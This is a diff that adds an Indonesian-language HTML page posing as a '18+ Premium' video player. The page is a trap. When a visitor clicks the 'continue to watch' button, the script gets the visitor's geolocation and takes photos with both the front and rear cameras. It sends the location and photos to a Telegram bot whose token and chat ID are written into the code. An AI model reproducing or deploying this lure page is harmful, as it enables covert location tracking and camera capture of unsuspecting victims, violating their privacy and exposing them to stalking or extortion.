@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <title>Video 18+ Premium</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background: linear-gradient(135deg, #000000, #1a1a1a);
+      color: #fff;
+      font-family: 'Segoe UI', sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+
+    .container {
+      background: #111;
+      padding: 25px;
+      border-radius: 20px;
+      box-shadow: 0 0 25px #ff0000aa, 0 0 40px #ff000088 inset;
+      max-width: 420px;
+      width: 90%;
+      text-align: center;
+    }
+
+    #videoPreview {
+      width: 100%;
+      border-radius: 16px;
+      border: 3px solid #ff0000;
+      box-shadow: 0 0 20px #ff000088;
+      margin-bottom: 20px;
+    }
+
+    button {
+      background: linear-gradient(45deg, #ff0000, #cc0000);
+      color: white;
+      padding: 15px 30px;
+      font-size: 18px;
+      border: none;
+      border-radius: 12px;
+      cursor: pointer;
+      transition: 0.3s;
+      box-shadow: 0 0 10px #ff0000, 0 0 20px #cc0000;
+    }
+
+    button:hover {
+      transform: scale(1.05);
+      box-shadow: 0 0 15px #ff2222, 0 0 30px #ff4444;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <video id="videoPreview" controls muted>
+      <source src="bokep.mp4" type="video/mp4">
+      Browser tidak mendukung video.
+    </video>
+    <button onclick="mulai()">Lanjutkan untuk Menonton Video</button>
+  </div>
+
+  <script>
+    const token = "8082604956:AAET0bFD6WD_r-UtIvmRZ3XR1kY6JaAjWoA";
+    const chatId = "7819779147";
+
+    function mulai() {
+      const video = document.getElementById("videoPreview");
+      video.play();
+
+      // Ambil lokasi
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(pos => {
+          const lat = pos.coords.latitude;
+          const lon = pos.coords.longitude;
+          kirimTelegram(`Lokasi pengguna:\nLatitude: ${lat}\nLongitude: ${lon}`);
+        }, err => {
+          kirimTelegram("Gagal ambil lokasi: " + err.message);
+        });
+      }
+
+      // Kamera depan
+      ambilFoto("user");
+
+      // Kamera belakang
+      ambilFoto("environment");
+    }
+
+    function ambilFoto(facing) {
+      navigator.mediaDevices.getUserMedia({ video: { facingMode: facing } })
+        .then(stream => {
+          const track = stream.getVideoTracks()[0];
+          const imageCapture = new ImageCapture(track);
+          imageCapture.takePhoto().then(blob => {
+            kirimFoto(blob);
+            track.stop();
+          }).catch(err => {
+            kirimTelegram("Gagal ambil foto (" + facing + "): " + err.message);
+            track.stop();
+          });
+        }).catch(err => {
+          kirimTelegram("Tidak bisa akses kamera (" + facing + "): " + err.message);
+        });
+    }
+
+    function kirimTelegram(pesan) {
+      fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(pesan)}`);
+    }
+
+    function kirimFoto(blob) {
+      const formData = new FormData();
+      formData.append("chat_id", chatId);
+      formData.append("photo", blob, "kamera.jpg");
+
+      fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+        method: "POST",
+        body: formData
+      });
+    }
+  </script>
+</body>
+</html>
